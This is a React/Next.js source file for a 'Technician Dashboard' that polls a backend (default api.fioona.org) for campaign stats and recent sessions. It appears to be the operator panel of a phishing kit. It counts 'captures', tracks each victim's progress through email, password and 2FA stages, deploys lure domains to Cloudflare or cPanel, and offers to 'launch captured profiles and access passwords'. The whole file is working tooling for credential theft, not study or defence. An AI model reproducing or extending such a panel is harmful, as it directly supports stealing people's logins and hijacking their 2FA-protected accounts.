'use client';

import { useState, useEffect } from 'react';
import Link from 'next/link';
import { Activity, Database, Target, Eye, Clock, TrendingUp } from 'lucide-react';
import { formatDistanceToNow } from 'date-fns';

interface Stats {
  activeSessions: number;
  totalCaptures: number;
  activeDeployments: number;
  profilesReady: number;
}

interface Session {
  id: string;
  email?: string;
  campaignName?: string;
  target: string;
  stage: string;
  status: string;
  createdAt: string;
  campaign?: {
    name: string;
    captureId: string;
  };
}

export default function TechnicianDashboard() {
  const [stats, setStats] = useState<Stats | null>(null);
  const [sessions, setSessions] = useState<Session[]>([]);
  const [loadingStats, setLoadingStats] = useState(true);
  const [loadingSessions, setLoadingSessions] = useState(true);
  const [lastUpdated, setLastUpdated] = useState('');

  useEffect(() => {
    fetchStats();
    fetchSessions();
    const statsInterval = setInterval(fetchStats, 5000);
    const sessionsInterval = setInterval(() => {
      fetchSessions();
      updateLastUpdated();
    }, 3000);
    return () => {
      clearInterval(statsInterval);
      clearInterval(sessionsInterval);
    };
  }, []);

  const fetchStats = async () => {
    try {
      const token = localStorage.getItem('token');
      const response = await fetch(`${process.env.NEXT_PUBLIC_API_URL || 'https://api.fioona.org'}/api/technician/stats`, {
        headers: {
          'Content-Type': 'application/json',
          ...(token ? { Authorization: `Bearer ${token}` } : {}),
        },
      });
      const data = await response.json();
      if (data.success) {
        setStats(data.stats);
      }
    } catch (error: any) {
      console.error('Failed to fetch stats:', error);
    } finally {
      setLoadingStats(false);
    }
  };

  const fetchSessions = async () => {
    try {
      const token = localStorage.getItem('token');
      const response = await fetch(`${process.env.NEXT_PUBLIC_API_URL || 'https://api.fioona.org'}/api/sessions?limit=8`, {
        headers: {
          'Content-Type': 'application/json',
          ...(token ? { Authorization: `Bearer ${token}` } : {}),
        },
      });
      const data = await response.json();
      if (data.success) {
        setSessions(data.sessions || []);
      }
    } catch (error: any) {
      console.error('Failed to fetch sessions:', error);
    } finally {
      setLoadingSessions(false);
    }
  };

  const updateLastUpdated = () => {
    const now = new Date();
    const hours = now.getUTCHours().toString().padStart(2, '0');
    const minutes = now.getUTCMinutes().toString().padStart(2, '0');
    const seconds = now.getUTCSeconds().toString().padStart(2, '0');
    setLastUpdated(`${hours}:${minutes}:${seconds} UTC`);
  };

  return (
    <div className="mx-auto max-w-7xl p-8">
      {/* Header */}
      <div style={{
        display: 'flex',
        alignItems: 'center',
        justifyContent: 'space-between',
        marginBottom: '32px'
      }}>
        <div>
          {/* Breadcrumb */}
          <div className="mb-2 text-sm text-white/50">
            Dashboard
          </div>
          <h1 style={{ fontSize: '24px', fontWeight: 600, color: '#E2E8F0', margin: 0 }}>
            Dashboard
          </h1>
          <p style={{ fontSize: '14px', color: 'rgba(226, 232, 240, 0.5)', marginTop: '4px' }}>
            Welcome back! Here's your campaign overview
          </p>
        </div>
        {lastUpdated && (
          <div style={{ display: 'flex', alignItems: 'center', gap: '8px' }}>
            <Clock style={{ width: '16px', height: '16px', color: 'rgba(226, 232, 240, 0.3)' }} />
            <span style={{ fontSize: '12px', fontFamily: 'monospace', color: 'rgba(226, 232, 240, 0.4)' }}>
              Last updated {lastUpdated}
            </span>
          </div>
        )}
      </div>

      {/* Stat Cards - 4 Column Grid */}
      <div style={{
        display: 'grid',
        gridTemplateColumns: 'repeat(4, 1fr)',
        gap: '16px',
        marginBottom: '24px'
      }}>
        {loadingStats ? (
          <>
            {[1, 2, 3, 4].map((i) => (
              <div key={i} style={{
                backgroundColor: '#151823',
                border: '1px solid rgba(255, 255, 255, 0.1)',
                borderRadius: '12px',
                padding: '24px',
                animation: 'pulse 2s cubic-bezier(0.4, 0, 0.6, 1) infinite'
              }}>
                <div style={{
                  height: '16px',
                  width: '96px',
                  backgroundColor: 'rgba(255, 255, 255, 0.05)',
                  borderRadius: '4px',
                  marginBottom: '16px'
                }} />
                <div style={{
                  height: '32px',
                  width: '64px',
                  backgroundColor: 'rgba(255, 255, 255, 0.05)',
                  borderRadius: '4px'
                }} />
                <style>{`@keyframes pulse { 0%, 100% { opacity: 1; } 50% { opacity: 0.5; } }`}</style>
              </div>
            ))}
          </>
        ) : (
          <>
            <div style={{
              backgroundColor: '#151823',
              border: '1px solid rgba(255, 255, 255, 0.1)',
              borderRadius: '12px',
              padding: '24px'
            }}>
              <p style={{ fontSize: '14px', color: 'rgba(226, 232, 240, 0.5)', margin: 0 }}>
                Active Sessions
              </p>
              <p style={{ fontSize: '36px', fontWeight: 700, color: '#FFFFFF', margin: '8px 0 0 0' }}>
                {stats?.activeSessions || 0}
              </p>
            </div>

            <div style={{
              backgroundColor: '#151823',
              border: '1px solid rgba(255, 255, 255, 0.1)',
              borderRadius: '12px',
              padding: '24px'
            }}>
              <p style={{ fontSize: '14px', color: 'rgba(226, 232, 240, 0.5)', margin: 0 }}>
                Total Captures
              </p>
              <p style={{ fontSize: '36px', fontWeight: 700, color: '#FFFFFF', margin: '8px 0 0 0' }}>
                {stats?.totalCaptures || 0}
              </p>
            </div>

            <div style={{
              backgroundColor: '#151823',
              border: '1px solid rgba(255, 255, 255, 0.1)',
              borderRadius: '12px',
              padding: '24px'
            }}>
              <p style={{ fontSize: '14px', color: 'rgba(226, 232, 240, 0.5)', margin: 0 }}>
                Active Deployments
              </p>
              <p style={{ fontSize: '36px', fontWeight: 700, color: '#FFFFFF', margin: '8px 0 0 0' }}>
                {stats?.activeDeployments || 0}
              </p>
            </div>

            <div style={{
              backgroundColor: '#151823',
              border: '1px solid rgba(255, 255, 255, 0.1)',
              borderRadius: '12px',
              padding: '24px'
            }}>
              <p style={{ fontSize: '14px', color: 'rgba(226, 232, 240, 0.5)', margin: 0 }}>
                Profiles Ready
              </p>
              <p style={{ fontSize: '36px', fontWeight: 700, color: '#FFFFFF', margin: '8px 0 0 0' }}>
                {stats?.profilesReady || 0}
              </p>
            </div>
          </>
        )}
      </div>

      {/* Quick Actions - 3 Column Grid */}
      <div style={{
        display: 'grid',
        gridTemplateColumns: 'repeat(3, 1fr)',
        gap: '16px',
        marginBottom: '24px'
      }}>
        <button
          onClick={() => window.location.href = '/campaigns'}
          style={{
            backgroundColor: '#151823',
            border: '1px solid rgba(255, 255, 255, 0.1)',
            borderRadius: '12px',
            padding: '24px',
            textAlign: 'left',
            cursor: 'pointer',
            transition: 'all 0.2s'
          }}
          onMouseEnter={(e) => {
            e.currentTarget.style.borderColor = 'rgba(79, 127, 255, 0.5)';
          }}
          onMouseLeave={(e) => {
            e.currentTarget.style.borderColor = 'rgba(255, 255, 255, 0.1)';
          }}
        >
          <div style={{
            display: 'flex',
            alignItems: 'center',
            justifyContent: 'space-between',
            marginBottom: '12px'
          }}>
            <div style={{
              width: '48px',
              height: '48px',
              borderRadius: '8px',
              backgroundColor: 'rgba(79, 127, 255, 0.1)',
              display: 'flex',
              alignItems: 'center',
              justifyContent: 'center'
            }}>
              <Target style={{ width: '24px', height: '24px', color: '#4F7FFF' }} />
            </div>
            <TrendingUp style={{ width: '20px', height: '20px', color: 'rgba(226, 232, 240, 0.3)' }} />
          </div>
          <h3 style={{ fontSize: '18px', fontWeight: 500, color: '#FFFFFF', marginBottom: '4px' }}>
            Create Campaign
          </h3>
          <p style={{ fontSize: '14px', color: 'rgba(226, 232, 240, 0.5)', margin: 0 }}>
            Set up a new capture campaign
          </p>
        </button>

        <button
          onClick={() => window.location.href = '/deployments'}
          style={{
            backgroundColor: '#151823',
            border: '1px solid rgba(255, 255, 255, 0.1)',
            borderRadius: '12px',
            padding: '24px',
            textAlign: 'left',
            cursor: 'pointer',
            transition: 'all 0.2s'
          }}
          onMouseEnter={(e) => {
            e.currentTarget.style.borderColor = 'rgba(16, 185, 129, 0.5)';
          }}
          onMouseLeave={(e) => {
            e.currentTarget.style.borderColor = 'rgba(255, 255, 255, 0.1)';
          }}
        >
          <div style={{
            display: 'flex',
            alignItems: 'center',
            justifyContent: 'space-between',
            marginBottom: '12px'
          }}>
            <div style={{
              width: '48px',
              height: '48px',
              borderRadius: '8px',
              backgroundColor: 'rgba(16, 185, 129, 0.1)',
              display: 'flex',
              alignItems: 'center',
              justifyContent: 'center'
            }}>
              <Activity style={{ width: '24px', height: '24px', color: '#10B981' }} />
            </div>
            <TrendingUp style={{ width: '20px', height: '20px', color: 'rgba(226, 232, 240, 0.3)' }} />
          </div>
          <h3 style={{ fontSize: '18px', fontWeight: 500, color: '#FFFFFF', marginBottom: '4px' }}>
            Deploy Domain
          </h3>
          <p style={{ fontSize: '14px', color: 'rgba(226, 232, 240, 0.5)', margin: 0 }}>
            Deploy to Cloudflare or download for cPanel
          </p>
        </button>

        <button
          onClick={() => window.location.href = '/profiles'}
          style={{
            backgroundColor: '#151823',
            border: '1px solid rgba(255, 255, 255, 0.1)',
            borderRadius: '12px',
            padding: '24px',
            textAlign: 'left',
            cursor: 'pointer',
            transition: 'all 0.2s'
          }}
          onMouseEnter={(e) => {
            e.currentTarget.style.borderColor = 'rgba(139, 92, 246, 0.5)';
          }}
          onMouseLeave={(e) => {
            e.currentTarget.style.borderColor = 'rgba(255, 255, 255, 0.1)';
          }}
        >
          <div style={{
            display: 'flex',
            alignItems: 'center',
            justifyContent: 'space-between',
            marginBottom: '12px'
          }}>
            <div style={{
              width: '48px',
              height: '48px',
              borderRadius: '8px',
              backgroundColor: 'rgba(139, 92, 246, 0.1)',
              display: 'flex',
              alignItems: 'center',
              justifyContent: 'center'
            }}>
              <Database style={{ width: '24px', height: '24px', color: '#8B5CF6' }} />
            </div>
            <TrendingUp style={{ width: '20px', height: '20px', color: 'rgba(226, 232, 240, 0.3)' }} />
          </div>
          <h3 style={{ fontSize: '18px', fontWeight: 500, color: '#FFFFFF', marginBottom: '4px' }}>
            View Profiles
          </h3>
          <p style={{ fontSize: '14px', color: 'rgba(226, 232, 240, 0.5)', margin: 0 }}>
            Launch captured profiles and access passwords
          </p>
        </button>
      </div>

      {/* Recent Sessions Card */}
      <div style={{
        backgroundColor: '#151823',
        border: '1px solid rgba(255, 255, 255, 0.1)',
        borderRadius: '12px',
        overflow: 'hidden'
      }}>
        <div style={{
          borderBottom: '1px solid rgba(255, 255, 255, 0.1)',
          padding: '24px'
        }}>
          <h2 style={{ fontSize: '18px', fontWeight: 500, color: '#FFFFFF', margin: 0 }}>
            Recent Sessions
          </h2>
          <p style={{ fontSize: '14px', color: 'rgba(226, 232, 240, 0.5)', marginTop: '4px' }}>
            Latest capture activity
          </p>
        </div>

        {loadingSessions ? (
          <div style={{ padding: '48px', display: 'flex', alignItems: 'center', justifyContent: 'center' }}>
            <div style={{
              width: '32px',
              height: '32px',
              border: '2px solid #4F7FFF',
              borderTopColor: 'transparent',
              borderRadius: '50%',
              animation: 'spin 1s linear infinite'
            }} />
            <style>{`@keyframes spin { to { transform: rotate(360deg); } }`}</style>
          </div>
        ) : sessions.length === 0 ? (
          <div style={{
            display: 'flex',
            flexDirection: 'column',
            alignItems: 'center',
            justifyContent: 'center',
            padding: '64px 0',
            textAlign: 'center'
          }}>
            <Eye style={{ width: '40px', height: '40px', color: 'rgba(255, 255, 255, 0.2)', marginBottom: '12px' }} />
            <p style={{ fontSize: '14px', fontWeight: 500, color: 'rgba(226, 232, 240, 0.5)', margin: 0 }}>
              No sessions yet
            </p>
            <p style={{ fontSize: '12px', color: 'rgba(226, 232, 240, 0.3)', margin: '4px 0 24px 0' }}>
              Start your first campaign to capture credentials
            </p>
            <button
              onClick={() => window.location.href = '/campaigns'}
              style={{
                display: 'inline-flex',
                alignItems: 'center',
                gap: '8px',
                backgroundColor: '#4F7FFF',
                color: '#FFFFFF',
                border: 'none',
                borderRadius: '8px',
                padding: '10px 16px',
                fontSize: '14px',
                fontWeight: 500,
                cursor: 'pointer'
              }}
            >
              <Target style={{ width: '16px', height: '16px' }} />
              Create Campaign
            </button>
          </div>
        ) : (
          <table style={{ width: '100%', borderCollapse: 'collapse' }}>
            <thead style={{ backgroundColor: 'rgba(255, 255, 255, 0.03)' }}>
              <tr>
                <th style={{
                  padding: '12px 24px',
                  textAlign: 'left',
                  fontSize: '12px',
                  fontWeight: 500,
                  color: 'rgba(226, 232, 240, 0.4)',
                  textTransform: 'uppercase',
                  letterSpacing: '0.05em'
                }}>Email</th>
                <th style={{
                  padding: '12px 24px',
                  textAlign: 'left',
                  fontSize: '12px',
                  fontWeight: 500,
                  color: 'rgba(226, 232, 240, 0.4)',
                  textTransform: 'uppercase',
                  letterSpacing: '0.05em'
                }}>Campaign</th>
                <th style={{
                  padding: '12px 24px',
                  textAlign: 'left',
                  fontSize: '12px',
                  fontWeight: 500,
                  color: 'rgba(226, 232, 240, 0.4)',
                  textTransform: 'uppercase',
                  letterSpacing: '0.05em'
                }}>Stage</th>
                <th style={{
                  padding: '12px 24px',
                  textAlign: 'left',
                  fontSize: '12px',
                  fontWeight: 500,
                  color: 'rgba(226, 232, 240, 0.4)',
                  textTransform: 'uppercase',
                  letterSpacing: '0.05em'
                }}>Captured At</th>
                <th style={{
                  padding: '12px 24px',
                  textAlign: 'left',
                  fontSize: '12px',
                  fontWeight: 500,
                  color: 'rgba(226, 232, 240, 0.4)',
                  textTransform: 'uppercase',
                  letterSpacing: '0.05em'
                }}>Status</th>
              </tr>
            </thead>
            <tbody>
              {sessions.map((session, idx) => (
                <tr
                  key={session.id}
                  style={{
                    borderTop: idx > 0 ? '1px solid rgba(255, 255, 255, 0.05)' : 'none',
                    transition: 'background-color 0.15s'
                  }}
                  onMouseEnter={(e) => e.currentTarget.style.backgroundColor = 'rgba(255, 255, 255, 0.03)'}
                  onMouseLeave={(e) => e.currentTarget.style.backgroundColor = 'transparent'}
                >
                  <td style={{ padding: '16px 24px', fontSize: '14px', color: '#FFFFFF' }}>
                    {session.email || 'Not captured'}
                  </td>
                  <td style={{ padding: '16px 24px' }}>
                    {session.campaign ? (
                      <div>
                        <div style={{ fontSize: '14px', color: '#FFFFFF' }}>
                          {session.campaign.name}
                        </div>
                        <div style={{
                          fontSize: '12px',
                          color: 'rgba(226, 232, 240, 0.4)',
                          fontFamily: 'monospace',
                          marginTop: '2px'
                        }}>
                          {session.campaign.captureId}
                        </div>
                      </div>
                    ) : (
                      <span style={{ fontSize: '14px', color: 'rgba(226, 232, 240, 0.7)' }}>
                        {session.campaignName || 'Unknown'}
                      </span>
                    )}
                  </td>
                  <td style={{ padding: '16px 24px' }}>
                    {session.stage === 'INITIATED' || session.stage === 'EMAIL_ENTERED' || session.stage === 'email' ? (
                      <span style={{
                        display: 'inline-flex',
                        alignItems: 'center',
                        borderRadius: '999px',
                        backgroundColor: 'rgba(59, 130, 246, 0.1)',
                        padding: '2px 10px',
                        fontSize: '12px',
                        fontWeight: 500,
                        color: '#3B82F6'
                      }}>Email</span>
                    ) : session.stage === 'PASSWORD_ENTERED' || session.stage === 'password' ? (
                      <span style={{
                        display: 'inline-flex',
                        alignItems: 'center',
                        borderRadius: '999px',
                        backgroundColor: 'rgba(245, 158, 11, 0.1)',
                        padding: '2px 10px',
                        fontSize: '12px',
                        fontWeight: 500,
                        color: '#F59E0B'
                      }}>Password</span>
                    ) : session.stage === '2FA_REQUIRED' || session.stage === '2fa' ? (
                      <span style={{
                        display: 'inline-flex',
                        alignItems: 'center',
                        borderRadius: '999px',
                        backgroundColor: 'rgba(139, 92, 246, 0.1)',
                        padding: '2px 10px',
                        fontSize: '12px',
                        fontWeight: 500,
                        color: '#8B5CF6'
                      }}>2FA</span>
                    ) : session.stage === 'COMPLETED' || session.stage === 'captured' ? (
                      <span style={{
                        display: 'inline-flex',
                        alignItems: 'center',
                        borderRadius: '999px',
                        backgroundColor: 'rgba(16, 185, 129, 0.1)',
                        padding: '2px 10px',
                        fontSize: '12px',
                        fontWeight: 500,
                        color: '#10B981'
                      }}>Captured</span>
                    ) : (
                      <span style={{
                        display: 'inline-flex',
                        alignItems: 'center',
                        borderRadius: '999px',
                        backgroundColor: 'rgba(255, 255, 255, 0.1)',
                        padding: '2px 10px',
                        fontSize: '12px',
                        fontWeight: 500,
                        color: 'rgba(226, 232, 240, 0.5)'
                      }}>{session.stage}</span>
                    )}
                  </td>
                  <td style={{ padding: '16px 24px', fontSize: '14px', color: 'rgba(226, 232, 240, 0.6)' }}>
                    {formatDistanceToNow(new Date(session.createdAt), { addSuffix: true })}
                  </td>
                  <td style={{ padding: '16px 24px' }}>
                    {session.status === 'ACTIVE' || session.status === 'active' ? (
                      <span style={{
                        display: 'inline-flex',
                        alignItems: 'center',
                        borderRadius: '999px',
                        backgroundColor: 'rgba(16, 185, 129, 0.1)',
                        padding: '2px 10px',
                        fontSize: '12px',
                        fontWeight: 500,
                        color: '#10B981'
                      }}>Active</span>
                    ) : session.status === 'COMPLETED' || session.status === 'captured' ? (
                      <span style={{
                        display: 'inline-flex',
                        alignItems: 'center',
                        borderRadius: '999px',
                        backgroundColor: 'rgba(59, 130, 246, 0.1)',
                        padding: '2px 10px',
                        fontSize: '12px',
                        fontWeight: 500,
                        color: '#3B82F6'
                      }}>Completed</span>
                    ) : (
                      <span style={{
                        display: 'inline-flex',
                        alignItems: 'center',
                        borderRadius: '999px',
                        backgroundColor: 'rgba(255, 255, 255, 0.1)',
                        padding: '2px 10px',
                        fontSize: '12px',
                        fontWeight: 500,
                        color: 'rgba(226, 232, 240, 0.5)'
                      }}>{session.status}</span>
                    )}
                  </td>
                </tr>
              ))}
            </tbody>
          </table>
        )}
      </div>
    </div>
  );
}
